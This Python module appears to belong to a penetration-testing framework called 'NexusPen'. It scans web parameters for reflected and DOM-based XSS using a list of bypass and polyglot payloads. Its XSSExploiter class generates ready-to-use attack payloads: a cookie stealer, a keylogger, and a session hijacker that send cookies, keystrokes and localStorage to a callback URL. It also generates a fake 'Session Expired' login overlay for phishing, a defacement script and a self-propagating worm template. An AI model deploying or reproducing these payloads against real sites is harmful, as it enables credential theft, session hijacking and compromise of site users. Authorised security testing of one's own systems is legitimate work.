#!/usr/bin/env python3
"""
NexusPen - XSS Scanner Module
=============================
Cross-Site Scripting detection and exploitation.
"""

import re
import urllib.parse
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class XSSFinding:
    """XSS vulnerability finding."""
    url: str
    parameter: str
    payload: str
    xss_type: str  # reflected, stored, dom
    context: str
    severity: str = "high"


class XSSScanner:
    """
    Cross-Site Scripting vulnerability scanner.
    """
    
    # XSS Payloads
    PAYLOADS = [
        # Basic payloads
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        
        # Event handlers
        '" onmouseover="alert(1)"',
        "' onmouseover='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        
        # Breaking out of attributes
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</script><script>alert(1)</script>',
        
        # JavaScript context
        "';alert(1)//",
        '";alert(1)//',
        '`${alert(1)}`',
        
        # Filter bypass
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img/src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<img src=x onerror="alert(1)">',
        
        # HTML encoding bypass
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '\x3cscript\x3ealert(1)\x3c/script\x3e',
        
        # Polyglots
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    ]
    
    # DOM-based XSS sinks
    DOM_SINKS = [
        'document.write',
        'document.writeln',
        'document.innerHTML',
        'document.outerHTML',
        'eval(',
        'setTimeout(',
        'setInterval(',
        'document.location',
        'window.location',
        'location.href',
        'location.assign',
        'location.replace',
    ]
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
        self.session = None
        self.findings: List[XSSFinding] = []
    
    def setup_session(self):
        """Setup requests session."""
        import requests
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_url(self, url: str, params: Dict = None) -> List[XSSFinding]:
        """
        Scan a URL for XSS vulnerabilities.
        
        Args:
            url: Target URL
            params: Parameters to test
        """
        console.print(f"\n[cyan]🔍 Scanning for XSS: {url}[/cyan]")
        
        if not self.session:
            self.setup_session()
        
        findings = []
        
        # Parse URL parameters if not provided
        if not params:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
        
        for param, value in params.items():
            console.print(f"[cyan]  Testing parameter: {param}[/cyan]")
            
            for payload in self.PAYLOADS:
                finding = self._test_payload(url, param, payload)
                if finding:
                    findings.append(finding)
                    console.print(f"[green]  ✓ XSS found in {param}![/green]")
                    break  # One finding per parameter is enough
        
        self.findings.extend(findings)
        return findings
    
    def _test_payload(self, url: str, param: str, payload: str) -> Optional[XSSFinding]:
        """Test a single payload."""
        try:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            params[param] = payload
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
            
            response = self.session.get(test_url, timeout=10, verify=False)
            
            # Check if payload is reflected
            if payload in response.text:
                context = self._identify_context(response.text, payload)
                return XSSFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    xss_type='reflected',
                    context=context
                )
            
            # Check for HTML-decoded reflection
            decoded = urllib.parse.unquote(payload)
            if decoded in response.text:
                return XSSFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    xss_type='reflected',
                    context='html-decoded'
                )
                
        except Exception as e:
            pass
        
        return None
    
    def _identify_context(self, html: str, payload: str) -> str:
        """Identify the context where payload is reflected."""
        idx = html.find(payload)
        if idx == -1:
            return 'unknown'
        
        before = html[max(0, idx-50):idx]
        after = html[idx:min(len(html), idx+len(payload)+50)]
        
        # Check context
        if '<script' in before.lower():
            return 'javascript'
        elif 'value=' in before or 'href=' in before:
            return 'attribute'
        elif '<!--' in before:
            return 'comment'
        else:
            return 'html'
    
    def scan_dom_xss(self, url: str) -> List[XSSFinding]:
        """
        Scan for DOM-based XSS.
        """
        console.print(f"\n[cyan]🔍 Scanning for DOM XSS: {url}[/cyan]")
        
        findings = []
        
        if not self.session:
            self.setup_session()
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            
            # Find JavaScript code
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', response.text, re.DOTALL | re.IGNORECASE)
            
            for script in scripts:
                for sink in self.DOM_SINKS:
                    if sink in script:
                        # Check for user input sources
                        sources = ['location.hash', 'location.search', 'location.href',
                                  'document.URL', 'document.referrer', 'window.name']
                        
                        for source in sources:
                            if source in script:
                                findings.append(XSSFinding(
                                    url=url,
                                    parameter=source,
                                    payload=f"{source} -> {sink}",
                                    xss_type='dom',
                                    context='javascript'
                                ))
                                console.print(f"[yellow]  ⚠️ Potential DOM XSS: {source} -> {sink}[/yellow]")
                                
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        self.findings.extend(findings)
        return findings
    
    def display_findings(self):
        """Display XSS findings."""
        if not self.findings:
            console.print("[green]✓ No XSS vulnerabilities found[/green]")
            return
        
        table = Table(title="XSS Vulnerabilities", show_header=True,
                     header_style="bold red")
        table.add_column("Type", style="cyan")
        table.add_column("Parameter", style="yellow")
        table.add_column("Context", style="white")
        table.add_column("URL", style="dim", width=40)
        
        for finding in self.findings:
            table.add_row(
                finding.xss_type,
                finding.parameter,
                finding.context,
                finding.url[:40] + "..." if len(finding.url) > 40 else finding.url
            )
        
        console.print(table)


class XSSExploiter:
    """
    XSS exploitation utilities.
    """
    
    @staticmethod
    def cookie_stealer(callback_url: str) -> str:
        """Generate cookie stealer payload."""
        return f'<script>new Image().src="{callback_url}?c="+document.cookie</script>'
    
    @staticmethod
    def keylogger(callback_url: str) -> str:
        """Generate keylogger payload."""
        return f'''<script>
document.onkeypress=function(e){{
    new Image().src="{callback_url}?k="+e.key;
}}
</script>'''
    
    @staticmethod
    def phishing_form(action_url: str) -> str:
        """Generate phishing form overlay."""
        return f'''<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
<h1>Session Expired</h1>
<form action="{action_url}" method="POST">
<input name="username" placeholder="Username"><br>
<input name="password" type="password" placeholder="Password"><br>
<button>Login</button>
</form>
</div>'''
    
    @staticmethod
    def defacement(message: str) -> str:
        """Generate defacement payload."""
        return f'''<script>document.body.innerHTML='<h1 style="color:red;font-size:50px;">{message}</h1>'</script>'''
    
    @staticmethod
    def session_hijack(callback_url: str) -> str:
        """Generate session hijack payload."""
        return f'''<script>
fetch('{callback_url}', {{
    method: 'POST',
    body: JSON.stringify({{
        cookie: document.cookie,
        url: window.location.href,
        localStorage: JSON.stringify(localStorage)
    }})
}});
</script>'''
    
    @staticmethod
    def worm_template() -> str:
        """Generate XSS worm template."""
        return '''<script>
var payload = encodeURIComponent(document.currentScript.innerHTML);
// Self-propagate through vulnerable endpoint
fetch('/vulnerable/endpoint?param=' + payload);
</script>'''
